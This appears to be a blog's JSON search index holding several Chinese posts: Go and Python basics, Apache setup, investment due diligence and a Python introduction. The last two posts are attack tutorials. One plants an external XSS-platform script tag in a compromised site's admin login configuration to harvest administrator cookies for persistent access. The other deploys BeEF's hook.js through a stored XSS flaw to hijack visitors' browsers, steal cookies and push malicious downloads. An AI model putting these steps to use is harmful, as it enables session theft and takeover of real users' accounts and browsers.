* yearSeconds //变量的声明赋值二合一（只能在函数内部） lightYearDistance := lightSpeed * yearSeconds //计算一年大概有多少天 seasonDays := monthDays * months fmt.Println(\"一光年有\",lightYearDistance,\"公里；一个年有\",seasonDays,\"天\")&#125;func main() &#123; // 一次性定义多个常量 const a,b,c = 1,2,3 //一次性定义多个变量 var d,e,f = 4,5,6 //输出 fmt.Println(a,b,c) fmt.Println(d,e,f)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础","slug":"Golang基础","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础/"},{"name":"Golang常量与变量里表达式","slug":"Golang常量与变量里表达式","permalink":"https://xiaowuyoucy.github.io/tags/Golang常量与变量里表达式/"}]},{"title":"Python运算符","slug":"201609060218","date":"2019-09-05T18:20:00.000Z","updated":"2019-09-05T21:19:05.032Z","comments":true,"path":"2019/09/06/201609060218/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/09/06/201609060218/","excerpt":"","text":"本章节主要说明Python的运算符。举个简单的例子 4 +5 = 9 。 例子中，4 和 5 被称为操作数，&quot;+&quot; 称为运算符。 Python语言支持以下类型的运算符: Python算术运算符 以下假设变量： a=10，b=20： 运算符描述实例 +加 - 两个对象相加 a + b 输出结果 30 -减 - 得到负数或是一个数减去另一个数 a - b 输出结果 -10 *乘 - 两个数相乘或是返回一个被重复若干次的字符串 a * b 输出结果 200 /除 - x除以y b / a 输出结果 2 %取模 - 返回除法的余数 b % a 输出结果 0 **幂 - 返回x的y次幂 a**b 为10的20次方， 输出结果 100000000000000000000 //取整除 - 返回商的整数部分（向下取整） &gt;&gt;&gt; 9//2 4 &gt;&gt;&gt; -9//2 -5 以下实例演示了Python所有算术运算符的操作： 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2019/9/6 2:03# @Author : JIANWEIWEN# @Email : wjw19951218@gmail.com# @File : 1.运算符.py# @Software: PyCharma = 21b = 10c = 0c = a + bprint(\"1 - c 的值为：\", c)c = a - bprint(\"2 - c 的值为：\", c)c = a * bprint(\"3 - c 的值为：\", c)c = a / bprint(\"4 - c 的值为：\", c)c = a % bprint(\"5 - c 的值为：\", c)# 修改变量 a 、b 、ca = 2b = 3c = a ** bprint(\"6 - c 的值为：\", c)a = 10b = 5c = a // bprint(\"7 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 31 2 - c 的值为： 11 3 - c 的值为： 210 4 - c 的值为： 2 5 - c 的值为： 1 6 - c 的值为： 8 7 - c 的值为： 2 注意：Python2.x 里，整数除整数，只能得出整数。如果要得到小数部分，把其中一个数改成浮点数即可。 &gt;&gt;&gt; 1/2 0 &gt;&gt;&gt; 1.0/2 0.5 &gt;&gt;&gt; 1/float(2) 0.5 Python比较运算符 以下假设变量a为10，变量b为20： 运算符 描述 实例 == 等于 - 比较对象是否相等 (a == b) 返回 False。 != 不等于 - 比较两个对象是否不相等 (a != b) 返回 true. &lt;&gt; 不等于 - 比较两个对象是否不相等 (a &lt;&gt; b) 返回 true。这个运算符类似 != 。 &gt; 大于 - 返回x是否大于y (a &gt; b) 返回 False。 &lt; 小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。 (a &lt; b) 返回 true。 &gt;= 大于等于 - 返回x是否大于等于y。 (a &gt;= b) 返回 False。 &lt;= 小于等于 - 返回x是否小于等于y。 (a &lt;= b) 返回 true。 以下实例演示了Python所有比较运算符的操作： 1234567891011121314151617181920212223242526272829303132333435363738394041a = 21b = 10c = 0if a == b: print(\"1 - a 等于 b\")else: print( \"1 - a 不等于 b\")if a != b: print( \"2 - a 不等于 b\")else: print( \"2 - a 等于 b\")if a &lt; b: print( \"3 - a 不等于 b\")else: print( \"3 - a 等于 b\")if a &lt; b: print (\"4 - a 小于 b\")else: print( \"4 - a 大于等于 b\")if a &gt; b: print( \"5 - a 大于 b\")else: print (\"5 - a 小于等于 b\")# 修改变量 a 和 b 的值a = 5b = 20if a &lt;= b: print(\"6 - a 小于等于 b\")else: print(\"6 - a 大于 b\")if b &gt;= a: print(\"7 - b 大于等于 a\")else: print(\"7 - b 小于 a\") 以上实例输出结果： 1 - a 不等于 b 2 - a 不等于 b 3 - a 不等于 b 4 - a 大于等于 b 5 - a 大于 b 6 - a 小于等于 b 7 - b 大于等于 a 以下实例演示了Python所有赋值运算符的操作： 12345678910111213141516171819202122232425a = 21b = 10c = 0c = a + bprint( \"1 - c 的值为：\", c)c += aprint( \"2 - c 的值为：\", c)c *= aprint( \"3 - c 的值为：\", c)c /= aprint( \"4 - c 的值为：\", c)c = 2c %= aprint( \"5 - c 的值为：\", c)c **= aprint( \"6 - c 的值为：\", c)c //= aprint( \"7 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 31 2 - c 的值为： 52 3 - c 的值为： 1092 4 - c 的值为： 52 5 - c 的值为： 2 6 - c 的值为： 2097152 7 - c 的值为： 99864 Python位运算符 按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下： 下表中变量 a 为 60，b 为 13，二进制格式如下： a = 0011 1100 b = 0000 1101 ----------------- a&amp;b = 0000 1100 a|b = 0011 1101 a^b = 0011 0001 ~a = 1100 0011 运算符 描述 实例 &amp; 按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0 (a &amp; b) 输出结果 12 ，二进制解释： 0000 1100 | 按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。 (a | b) 输出结果 61 ，二进制解释： 0011 1101 ^ 按位异或运算符：当两对应的二进位相异时，结果为1 (a ^ b) 输出结果 49 ，二进制解释： 0011 0001 ~ 按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1 。~x 类似于 -x-1 (~a ) 输出结果 -61 ，二进制解释： 1100 0011，在一个有符号二进制数的补码形式。 &lt;&lt; 左移动运算符：运算数的各二进位全部左移若干位，由 &lt;&lt; 右边的数字指定了移动的位数，高位丢弃，低位补0。 a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000 &gt;&gt; 右移动运算符：把&quot;&gt;&gt;&quot;左边的运算数的各二进位全部右移若干位，&gt;&gt; 右边的数字指定了移动的位数 a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111 以下实例演示了Python所有位运算符的操作： 123456789101112131415161718192021a = 60 # 60 = 0011 1100b = 13 # 13 = 0000 1101c = 0c = a &amp; b # 12 = 0000 1100print(\"1 - c 的值为：\", c)c = a | b # 61 = 0011 1101print(\"2 - c 的值为：\", c)c = a ^ b # 49 = 0011 0001print(\"3 - c 的值为：\", c)c = ~a # -61 = 1100 0011print(\"4 - c 的值为：\", c)c = a &lt;&lt; 2 # 240 = 1111 0000print(\"5 - c 的值为：\", c)c = a &gt;&gt; 2 # 15 = 0000 1111print(\"6 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 12 2 - c 的值为： 61 3 - c 的值为： 49 4 - c 的值为： -61 5 - c 的值为： 240 6 - c 的值为： 15 Python逻辑运算符 Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20: 运算符 逻辑表达式 描述 实例 and x and y 布尔&quot;与&quot; - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。 (a and b) 返回 20。 or x or y 布尔&quot;或&quot; - 如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。 (a or b) 返回 10。 not not x 布尔&quot;非&quot; - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。 not(a and b) 返回 False 以上实例输出结果： 12345678910111213141516a = 0b = 20if a and b: print(\"3 - 变量 a 和 b 都为 true\")else: print(\"3 - 变量 a 和 b 有一个不为 true\")if a or b: print(\"4 - 变量 a 和 b 都为 true，或其中一个变量为 true\")else: print(\"4 - 变量 a 和 b 都不为 true\")if not (a and b): print(\"5 - 变量 a 和 b 都为 false，或其中一个变量为 false\")else: print(\"5 - 变量 a 和 b 都为 true\") 以上实例输出结果： 1 - 变量 a 和 b 都为 true 2 - 变量 a 和 b 都为 true，或其中一个变量为 true 3 - 变量 a 和 b 有一个不为 true 4 - 变量 a 和 b 都为 true，或其中一个变量为 true 5 - 变量 a 和 b 都为 false，或其中一个变量为 false Python成员运算符 除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。 运算符 描述 实例 in 如果在指定的序列中找到值返回 True，否则返回 False。 x 在 y 序列中 , 如果 x 在 y 序列中返回 True。 not in 如果在指定的序列中没有找到值返回 True，否则返回 False。 x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。 以下实例演示了Python所有成员运算符的操作： 1234567891011121314151617181920a = 10b = 20list = [1, 2, 3, 4, 5]if (a in list): print(\"1 - 变量 a 在给定的列表中 list 中\")else: print(\"1 - 变量 a 不在给定的列表中 list 中\")if (b not in list): print(\"2 - 变量 b 不在给定的列表中 list 中\")else: print(\"2 - 变量 b 在给定的列表中 list 中\")# 修改变量 a 的值a = 2if (a in list): print(\"3 - 变量 a 在给定的列表中 list 中\")else: print(\"3 - 变量 a 不在给定的列表中 list 中\") 以上实例输出结果： 1 - 变量 a 不在给定的列表中 list 中 2 - 变量 b 不在给定的列表中 list 中 3 - 变量 a 在给定的列表中 list 中 Python身份运算符 身份运算符用于比较两个对象的存储单元 运算符 描述 实例 is is 是判断两个标识符是不是引用自一个对象 x is y, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False is not is not 是判断两个标识符是不是引用自不同对象 x is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。 注： id() 函数用于获取对象内存地址。 以下实例演示了Python所有身份运算符的操作： 123456789101112131415161718192021222324a = 20b = 20if (a is b): print(\"1 - a 和 b 有相同的标识\")else: print(\"1 - a 和 b 没有相同的标识\")if (a is not b): print(\"2 - a 和 b 没有相同的标识\")else: print(\"2 - a 和 b 有相同的标识\")# 修改变量 b 的值b = 30if (a is b): print(\"3 - a 和 b 有相同的标识\")else: print(\"3 - a 和 b 没有相同的标识\")if (a is not b): print(\"4 - a 和 b 没有相同的标识\")else: print(\"4 - a 和 b 有相同的标识\") 以上实例输出结果： 1 - a 和 b 有相同的标识 2 - a 和 b 有相同的标识 3 - a 和 b 没有相同的标识 4 - a 和 b 没有相同的标识 is 与 == 区别： is 用于判断两个变量引用对象是否为同一个(同一块内存空间)， == 用于判断引用变量的值是否相等。 &gt;&gt;&gt; a = [1, 2, 3] &gt;&gt;&gt; b = a &gt;&gt;&gt; b is a True &gt;&gt;&gt; b == a True &gt;&gt;&gt; b = a[:] &gt;&gt;&gt; b is a False &gt;&gt;&gt; b == a True Python运算符优先级 以下表格列出了从最高到最低优先级的所有运算符： 运算符 描述 ** 指数 (最高优先级) ~ + - 按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@) * / % // 乘，除，取模和取整除 + - 加法减法 &gt;&gt; &lt;&lt; 右移，左移运算符 &amp; 位 ‘AND’ ^ | 位运算符 &lt;= &lt; &gt; &gt;= 比较运算符 &lt;&gt; == != 等于运算符 = %= /= //= -= += *= **= 赋值运算符 is is not 身份运算符 in not in 成员运算符 not and or 逻辑运算符 以下实例演示了Python所有运算符优先级的操作： 1234567891011121314151617a = 20b = 10c = 15d = 5e = 0e = (a + b) * c / d # ( 30 * 15 ) / 5print(\"(a + b) * c / d 运算结果为：\", e)e = (a + b) * c / d # (30 * 15 ) / 5print(\"((a + b) * c) / d 运算结果为：\", e)e = (a + b) * (c / d); # (30) * (15/5)print(\"(a + b) * (c / d) 运算结果为：\", e)e = a + (b * c) / d; # 20 + (150/5)print(\"a + (b * c) / d 运算结果为：\", e) 以上实例输出结果： (a + b) * c / d 运算结果为： 90 ((a + b) * c) / d 运算结果为： 90 (a + b) * (c / d) 运算结果为： 90 a + (b * c) / d 运算结果为： 50","categories":[{"name":"Python","slug":"Python","permalink":"https://xiaowuyoucy.github.io/categories/Python/"}],"tags":[{"name":"Python运算符","slug":"Python运算符","permalink":"https://xiaowuyoucy.github.io/tags/Python运算符/"}]},{"title":"apache配置","slug":"201908210144","date":"2019-08-20T17:54:00.000Z","updated":"2019-08-20T18:28:40.119Z","comments":true,"path":"2019/08/21/201908210144/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/08/21/201908210144/","excerpt":"","text":"1.1 Apache的安装 对应的软件如下： Apache安装步骤： 1.解压“httpd-2.4.29-x86-r2.zip”，并将解压后的所有文件拷贝到目标文件夹wamp/apache下。 2.修改apache主配置文件(httpd.conf)中的“SVRROOT”为apache的实际目录。 提示：要修改的文件为：wamp/apache/conf/httpd.conf，大约第38行处。 管理员模式下运行cmd(或powershell)，并在其中运行apache/bin下的命令httpd.exe 如下所示：httpd.exe -k install 提示： httpd.exe所在位置为：apache/bin/目录中 如果想要删除该服务，则运行：httpd.exe -k uninstallt 4.双击打开如下文件并启动服务：wamp/apche/bin/ApacheMonitor.exe 1.2 检测apache配置文件语法的命令","categories":[{"name":"apache","slug":"apache","permalink":"https://xiaowuyoucy.github.io/categories/apache/"}],"tags":[{"name":"apache配置","slug":"apache配置","permalink":"https://xiaowuyoucy.github.io/tags/apache配置/"},{"name":"apache环境变量","slug":"apache环境变量","permalink":"https://xiaowuyoucy.github.io/tags/apache环境变量/"}]},{"title":"如何判断一个项目是否值得投资","slug":"201907150214","date":"2019-07-14T18:27:00.000Z","updated":"2019-07-14T18:57:02.008Z","comments":true,"path":"2019/07/15/201907150214/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/07/15/201907150214/","excerpt":"","text":"一、看准 一个团队（1个团队） 投资就是投人，投资就是投团队，尤其要看准投团队的领头人。创东方对目标企业团队成员的要求是：富有激情、和善诚信、专业敬业、善于学习。 二、发掘 两个优势（1优势行业+2优势企业） 在优势行业中发掘、寻找优势企业。优势行业是指具有广阔发展前景、国家政策支持、市场成长空间巨大的行业；优势企业是在优势行业中具有核心竞争力，细分行业排名靠前的优秀企业，其核心业务或主营业务要突出，企业的核心竞争力要突出，要超越其他竞争者。 三、弄清 三个模式（1业务模式+2盈利模式+3营销模式） 就是弄清目标企业是如何挣钱的。业务模式是企业提供什么产品或服务，业务流程如何实现，包括业务逻辑是否可行，技术是否可行，是否符合消费者心理和使用习惯等，企业的人力、资金、资源是否足以支持。盈利模式是指企业如何挣钱，通过什么手段或环节挣钱。营销模式是企业如何推广自己的产品或服务，销售渠道、销售激励机制如何等。好的业务模式，必须能够赢利，好的赢利模式，必须能够推行。 四、查看 四个指标（1营业收入+2营业利润+3净利率+4增长率） PE 投资的重要目标是目标企业尽快改制上市，我们因此关注、查看近目标企业近三年的上述前两个指标尤为重要。PE投资非常看重的盈利能力和成长性，我们由此关注上述的后两个指标。净利率是销售净利润率，表达了一个企业的盈利能力和抗风险能力，增长率可以迅速降低投资成本，让投资人获取更高的投资回报。把握前四个指标，则基本把握了项目的可投资性。 五、厘清 五个结构（1股权结构+2高管结构+3业务结构+4客户结构+5供应商结构） 厘清五个结构也很重要，让投资人对目标企业的具体结构很清晰，便于判断企业的好坏优劣。 股权结构：主次分明，主次合理； 高管结构：结构合理，优势互补，团结协作； 业务结构：主营突出，不但研发新产品； 客户结构：既不太散又不太集中，客户有实力； 供应商结构：既不太散又不太集中，质量有保证。 六、考察六个层面（1历史合规+2财务规范+3依法纳税+4产权清晰+5劳动合规+6环保合规） 考察六个层面是对目标企业的深度了解，任何一个层面存在关键性问题，可能影响企业的改制上市。当然，有些企业存在一些细小暇疵，可以通过规范手段予以改进。 历史合规：目标企业的历史沿革合法和规，在注册验资、股权变更等方面不存在重大历史瑕疵； 财务规范：财务制度健全，会计标准合规，坚持公正审计； 依法纳税：不存在依法纳税的问题； 产权清晰：企业的产权清晰到位（含专利、商标、房产等），不存在纠纷； 劳动合规：严格执行劳动法规； 6. 环保合规：企业生产经营符合环保要求，不存在搬迁、处罚等隐患。 七、落实 七个关注（1制度汇编+2例会制度+3企业文化+4战略规划+5人力资源+6公共关系+7激励机制） 七个关注是对目标企业细小环节的关注。如果存在其中的问题，可以通过规范、引导的办法加以改进。但其现状是我们判断目标企业经营管理的重要依据。 制度汇编：查看企业的制度汇编可以迅速认识企业管理的规范程度。有的企业制度不全，更没有制度汇编； 例会制度：询问企业的例会情况（含总经理办公周例会、董事会例会、股东会例会）能够了解规范管理情况，也能了解企业高管对股东是否尊重； 企业文化：通过了解企业的文化建设能知道企业是否具有凝聚力和亲和力，是否具备长远发展的可能； 战略规划：了解企业的战略规划情况，可以知道企业的发展有无目标，查看其目标是否符合行业经济发展的实际方向； 人力资源：了解企业对员工培训、激励计划、使用办法，可以了解企业是否能充分调动全体员工发展业务的积极性和能动性，考察企业的综合竞争力； 公共关系：了解企业的公共关系策略和状况，可以知道企业是否具备社会公民意识，是否注重企业形象和品牌，是否具有社会责任意识； 激励机制：一个优秀的现代企业应该有一个激励员工、提升团队的机制或计划，否则，企业难于持续做强做大。 八、分析八个数据（1.总资产周转率、2资产负债率、3.流动比率、4.应收帐款周转天数（应收帐款周转率）、5、销售毛利率、6.净值报酬率、7.经营活动净现金流、8、市场占有率） 在厘清四个指标的基础上，我们很有必要分析以下八个数据，是我们对目标企业的深度分析、判断。 资产周转率：表示多少资产创造多少销售收入，表明一个公司是资产（资本）密集型还是轻资产型。该项指标反映资产总额的周转速度，周转越快，反映销售能力越强，企业可以通过薄利多销的办法，加速资产的周转，带来利润绝对数的增加。计算公式：总资产周转率=销售收入÷平均总资产 资产负债率：资产负债率是负债总额除以资产总额的百分比，也就是负债总额与资产总额的比例关系。资产负债率反映在总资产中有多大比例是通过借债来筹资的，也可以衡量企业在清算时保护债权人利益的程度；资产负债率的高低，体现一个企业的资本结构是否合理。计算公式：资产负债率=（负债总额÷资产总额）×100% 流动比率：流动比率是流动资产除以流动负债的比例，反映企业的短期偿债能力。流动资产是最容易变现的资产，流动资产越多，流动负债越少，则短期偿债能力越强。计算公式：流动比率=流动资产÷流动负债 应收帐款周转天数（应收帐款周转率）：应收帐款周转率反映应收帐款的周转速度，也就是年度内应收帐款转为现金的平均次数。用时间表示的周转速度是应收帐款周转天数，也叫平均收现期，表示自企业从取得应收帐款的权利到收回款项，转换为现金所需要的时间。一般来说，应收帐款周转率越高、平均收帐期越短，说明应收帐款收回快。否则，企业的营运资金会过多地呆滞在应收帐款上，影响正常的资金周转。计算公式：应收帐款周转率=销售收入÷平均应收帐款；应收帐款周转天数=360÷应收帐款周转率 销售毛利率：销售毛利率,表示每一元销售收入扣除销售产品或商品成本后,有多少钱可以用于各期间费用和形成利泣,是企业销售净利率的最初基础,没有足够大的毛利率便不能盈利。计算公式：销售毛利率=（销售收入-销售成本）÷销售收入）×100%。 净值报酬率：净值报酬率是净利润与平均股东权益（所有者权益）的百分比，也叫股东权益报酬率。该指标反映股东权益的收益水平。计算公式：净值报酬率=（净利润÷平均股东权益）×100% 经营活动净现金流：经营活动净现金流，是企业在一个会计期间（年度或月份，通常指年度）经营活动产生的现金流入与经营活动产生的现金流出的差额。这一指标说明经营活动产生现金的能力，企业筹集资金额根据实际生产经营需要，通过现金流量表，可以确定企业筹资总额。一般来说，企业财务状况越好，现金净流量越多，所需资金越少，反之，财务状况越差，现金净流量越少，所需资金越多。一个企业经营净现金流量为负，说明企业需筹集更多的资金满足于生产经营所需，否则企业正常生产经营难以为继。 市场占有率：市场占有率，也可称为“市场份额”是企业在运作的市场上所占有的百分比，是企业的产品在市场上所占份额，也就是企业对市场的控制能力。企业市场份额的不断扩大，可以使企业获得某种形式的垄断，这种垄断既能带来垄断利润又能保持一定的竞争优势。当一个企业获得市场25%的占有率时，一般就被认为控制了市场。市场占有率对企业至关重要，一方面它是反映企业经营业绩最关键的指标之一，另一方面它是企业市场地位最直观的体现。市场占有率是由企业的产品力、营销力和形象力共同决定的。 九、走好九个程序（1收集资料+2高管面谈+3企业考察+4竞争调查+5供应商走访+6客户走访+7协会走访+8政府走访+9券商咨询） 要做好一个投资项目，我们有很多程序要走，而且不同的目标企业所采取的程序应该有所不同、分别对待，但是以下就个程序是应该坚持履行的。 收集资料：通过多种形式收集企业资料； 高管面谈：高管面谈，是创业投资的一个初步环境也是非常重要的环节。依据过往经验，往往能很快得出对目标企业业务发展、团队素质的印象。有时一次高管接触，你就不想再深入下去了，因为印象不好。第一感觉往往很重要，也比较可靠。 企业考察：对企业的经营、研发、生产、管理、资源等实施实地考察；对高管以下的员工进行随机或不经意的访谈，能够得出更深层次的印象或结论。 竞争调查：梳理清楚该市场中的竞争格局和对手的情况。通过各种方式和途径对竞争企业进行考察、访谈或第三方评价；对比清楚市场中的各种竞争力量及其竞争优劣势。对竞争企业的信息和对比掌握得越充分、投资的判断就会越准！ 供应商走访：了解企业的采购量、信誉，可以帮助我们判断企业声誉、真实产量；同时也从侧面了解行业竞争格局； 客户走访：可以了解企业产品质量和受欢迎程度，了解企业真实销售情况，了解竞争企业情况；同时，客户自身的档次和优质情况也有助于判断企业的市场地位、以及市场需求的潜力和可持续程度。 协会走访：了解企业的行业地位和声誉，了解行业的发展态势； 政府走访：了解企业的行业地位和声誉，了解政府对企业所处行业的支持程度； 券商咨询：针对上市可行性和上市时间问题咨询券商，对我们判断企业成熟度有重要作用。 十、报告 十个内容（1 企业历史沿革2企业产品与技术3行业分析（机会与威胁） 4企业优势及不足 5发展规划6股权结构 7高管结构 8财务分析 9融资计划 10投资意见） 《尽职调查报告》是创业投资业务的基本功，是对前期工作的总结，是最终决策依据。写好《尽职调查报告》，至少应报告以下10个方面的主要内容。 企业历史沿革：股权变动情况，重大历史事件等； 企业产品与技术：公司业务情况、技术来源； 行业分析：行业概况、行业机会与威胁，竞争对手分析； 优势和不足：企业有哪些优势，哪些是核心竞争力；存在不足或缺陷，有无解决或改进办法； 发展规划：企业的近期、中期的发展规划和发展战略；以及发展规划的可实现性； 股权结构：股权结构情况，合理性分析； 高管结构：高管人员和技术人员背景情况，优势、劣势分析； 财务分析：近年各项财务数据或指标情况及分析； 融资计划：企业发展计划和融资计划及融资条件； 投资意见：投资经理对项目的总体意见或建议。 “厨师炒菜，各有各法。”每家创业投资团队都有自己看项目的办法，创东方的投资要诀只是其中的一种而已。","categories":[{"name":"理财投资","slug":"理财投资","permalink":"https://xiaowuyoucy.github.io/categories/理财投资/"}],"tags":[{"name":"理财，投资","slug":"理财，投资","permalink":"https://xiaowuyoucy.github.io/tags/理财，投资/"}]},{"title":"Python笔记","slug":"201905262134","date":"2019-05-26T13:46:01.000Z","updated":"2019-05-26T14:03:39.803Z","comments":true,"path":"2019/05/26/201905262134/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/05/26/201905262134/","excerpt":"","text":"Python是荷兰著名的“龟叔”Guido van Rossum在1989年圣诞节期间，为了打发无聊的圣诞节而编写的一个编程语言，现在，全世界差不多有600多种编程语言，但流行的编程语言也就那么20来种。如果你听说过TIOBE排行榜，你就能知道编程语言的大致流行程度。这是最近10年最常用的10种编程语言的变化图： 总的来说，这几种编程语言各有千秋。C语言是可以用来编写操作系统的贴近硬件的语言，所以，C语言适合开发那些追求运行速度、充分发挥硬件性能的程序。而Python是用来编写应用程序的高级编程语言，当你用一种语言开始作真正的软件开发时，你除了编写代码外，还需要很多基本的已经写好的现成的东西，来帮助你加快开发进度。比如说，要编写一个电子邮件客户端，如果先从最底层开始编写网络协议相关的代码，那估计一年半载也开发不出来。高级编程语言通常都会提供一个比较完善的基础代码库，让你能直接调用，比如，针对电子邮件协议的SMTP库，针对桌面环境的GUI库，在这些已有的代码库的基础上开发，一个电子邮件客户端几天就能开发出来。 Python就为我们提供了非常完善的基础代码库，覆盖了网络、文件、GUI、数据库、文本等大量内容，被形象地称作“内置电池（batteries included）”。用Python开发，许多功能不必从零编写，直接使用现成的即可；除了内置的库外，Python还有大量的第三方库，也就是别人开发的，供你直接使用的东西。当然，如果你开发的代码通过很好的封装，也可以作为第三方库给别人使用。 许多大型网站就是用Python开发的，例如YouTube、Instagram，还有国内的豆瓣。很多大公司，包括Google、Yahoo等，甚至NASA（美国航空航天局）都大量地使用Python；龟叔给Python的定位是“优雅”、“明确”、“简单”，所以Python程序看上去总是简单易懂，初学者学Python，不但入门容易，而且将来深入下去，可以编写那些非常非常复杂的程序。 总的来说，Python的哲学就是简单优雅，尽量写容易看明白的代码，尽量写少的代码。如果一个资深程序员向你炫耀他写的晦涩难懂、动不动就几万行的代码，你可以尽情地嘲笑他。 那Python适合开发哪些类型的应用呢？ 首选是网络应用，包括网站、后台服务等等； 其次是许多日常需要的小工具，包括系统管理员需要的脚本任务等等； 另外就是把其他语言开发的程序再包装起来，方便使用。 最后说说Python的缺点。 任何编程语言都有缺点，Python也不例外。优点说过了，那Python有哪些缺点呢？ 第一个缺点就是运行速度慢，和C程序相比非常慢，因为Python是解释型语言，你的代码在执行时会一行一行地翻译成CPU能理解的机器码，这个翻译过程非常耗时，所以很慢。而C程序是运行前直接编译成CPU能执行的机器码，所以非常快。 但是大量的应用程序不需要这么快的运行速度，因为用户根本感觉不出来。例如开发一个下载MP3的网络应用程序，C程序的运行时间需要0.001秒，而Python程序的运行时间需要0.1秒，慢了100倍，但由于网络更慢，需要等待1秒，你想，用户能感觉到1.001秒和1.1秒的区别吗？这就好比F1赛车和普通的出租车在北京三环路上行驶的道理一样，虽然F1赛车理论时速高达400公里，但由于三环路堵车的时速只有20公里，因此，作为乘客，你感觉的时速永远是20公里。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"Python教程","slug":"Python教程","permalink":"https://xiaowuyoucy.github.io/tags/Python教程/"},{"name":"Python笔记","slug":"Python笔记","permalink":"https://xiaowuyoucy.github.io/tags/Python笔记/"}]},{"title":"XSS-Cookie维持权限应用","slug":"201904232243","date":"2019-04-23T14:44:01.000Z","updated":"2019-04-24T05:19:22.541Z","comments":true,"path":"2019/04/23/201904232243/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/23/201904232243/","excerpt":"","text":"Cookie维持权限应用 条件： 1.已经获取网站webshell权限 2.网站后台目录文件有可写权限 漏洞原理： 利用js代码获取每次登陆成功的用户Cookie（管理员权限） 接下来我们演示一下，这个过程，这里我首先注册一下配置一下XSS平台 推荐大家到 https://xsspt.com 是个免费不错的XSS测试利用平台， 注册好之后我们添加项目，如下图所示配置： 填写完信息之后点击下一步 勾选上这几项，之后点击下一步，就配置完成XSS基本的测试了， 之后找到该项目的测试代码。 将如下代码植入怀疑出现xss的地方（注意’的转义），即可在 项目内容 观看XSS效果。 1&lt;script src=https://xsspt.com/9f6glg&gt;&lt;/script&gt; 把该代码嵌入到你要维权的后台登陆的那个配置文件即可，这里我就搭建一个本地测试， 我找到该项目后台的配置文件， 用编辑的方式打开，把刚才XSS测试的代码复制进去，之后点击关闭保持， 好，做完这步操作之后，我们来测试一下，假设现在管理员登陆后台，我们看看能不能通过， 刚才的手段获取到我们想要的信息， 登陆进来了，我们这时再回到XSS平台点击项目，看看有没有接收到管理员登陆的Cookie和其他一些相关信息， 看这里已经实时的把管理员登陆的Cookie和其他一些相关信息接收过来了，这些都是很常见的一些， Cookie维权方式之一吧。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://xiaowuyoucy.github.io/tags/XSS/"},{"name":"Cookie","slug":"Cookie","permalink":"https://xiaowuyoucy.github.io/tags/Cookie/"}]},{"title":"beef劫持客户端浏览器","slug":"201904250308","date":"2019-04-23T14:44:01.000Z","updated":"2019-05-07T13:59:05.919Z","comments":true,"path":"2019/04/23/201904250308/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/23/201904250308/","excerpt":"","text":"kali linux里集合了beef劫持客户端浏览器的工具，beef是比较著名的一个xss利用框架， 它是基于web界面的交换方式友好，高度集成，开源的一个项目！和国外其他渗透测试项目一样，它也可以和其他很多工具结合使用，如MSF。 使用方法： 打开kali linux 打开终端搜索 find / -name beef root@kali:~# find / -name beef /usr/share/beef-xss/beef /usr/share/python-faraday/plugins/repo/beef find: ‘/run/user/130/gvfs’: 权限不够 root@kali:~# ^C root@kali:~# find搜索到beef的所在路径，我们需要切换到beef的所在目录将其启动即可 cd /usr/share/beef-xss 切换到beef所在目录 ./beef 启动运行 启动之后beef会有详细的参数地址给出，如下图： Hook URL: http://192.168.1.115:3000/hook.js hook是一个利用的js外链，每当XSS攻击执行该行js代码之后就会被触发 UI URL: http://192.168.1.115:3000/ui/panel 这是beef的控制端，每当hook被触发之后beef控制端就能控制客户端的一系列浏览器活动信息，比如Cookie和转跳，恶意下载木马链接等等操作。 我们把beef的利用代码 http://192.168.1.115:3000/hook.js 以js脚本的方式提交在有xss利用漏洞的留言板上， 每当客户端的浏览器访问即触发beef的利用代码，beef服务端上线达到控制客户端的浏览器权限 我们模拟一下客户端访问浏览器，这是会触发beef的恶意代码，我们可以看到如下的gif，beef的服务器可以，进行客户端浏览器的操作，转跳 ,下载，盗取cookie等… 结合beef 